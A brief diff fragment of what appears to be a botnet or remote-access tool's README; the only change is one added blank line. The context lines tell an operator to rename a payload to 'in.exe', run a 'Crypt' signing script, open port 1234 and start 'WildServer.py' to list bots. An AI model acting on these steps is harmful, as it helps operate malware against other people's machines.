@@ -58,6 +58,7 @@ Rename the file to `in.exe`, copy to the `Crypt` folder and run `Signer.bat`
 
 ### PANEL
 If not localhost open `in&out` `TCP/UDP` connections with port `1234`
+
 Start `WildServer.py`
 
 `list' - see all bots
